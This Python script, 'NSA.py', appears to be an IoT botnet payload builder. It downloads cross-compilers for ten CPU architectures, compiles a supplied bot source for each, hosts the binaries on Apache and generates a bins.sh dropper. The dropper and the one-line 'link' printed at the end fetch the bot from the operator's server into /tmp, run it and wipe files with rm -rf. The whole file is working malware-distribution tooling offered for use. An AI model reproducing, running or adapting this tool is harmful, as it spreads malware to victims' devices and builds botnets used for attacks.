import subprocess, sys
	
if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mpython NSA.py <Bot Name> <Server IP>\x1b[0m")
    exit(1)
	
bot = sys.argv[1]
YN = raw_input("Get arch's? Y/n:")
if YN.lower() == "y":
    get_arch = True
else:
    get_arch = False

compiles = ["mips",
             "mipsel",
             "sh4",
             "x86_64",
             "armv6l",
             "i686",
             "powerpc",
             "i586",
             "m68k",
             "sparc"] 

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2']

ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-x86_64",
       "cross-compiler-armv6l",
       "cross-compiler-i686",
       "cross-compiler-powerpc",
       "cross-compiler-i586",
       "cross-compiler-m68k",
       "cross-compiler-sparc"]

def run(cmd):
    subprocess.call(cmd, shell=True)

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *.tar.*")
        run("rm -rf *tar.bz2")
		
    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -lpthread -pthread -D" + arch.upper() + " -o " + compiles[num] + " " + bot + " > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your apache")

run("yum install httpd -y")
run("apt-get install apache2 -y")
run("service apache2 start")
run("service httpd start")

for i in compiles:
    run("mv " + i + " /var/www/html/")

run("service apache2 restart")
run("service httpd restart")

for i in compiles:
    run('echo -e "cd /tmp; rm -rf *; wget -q http://' + ip + '/' + i + '; chmod +x ' + i + '; sh ' + i + '; rm -rf *" >> /var/www/html/bins.sh')

run("service apache2 restart")
run("service httpd restart")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')

print("\x1b[0;32mSuccessfully cross compiled!\x1b[0m")
print("\x1b[0;32mYour link: cd /tmp; rm -rf *; wget -q http://" + ip + "/bins.sh; chmod +x bins.sh; sh bins.sh; rm -rf *\x1b[0m")
print
print("\x1b[0;32mNSA.py coded by ZoZo\x1b[0m")

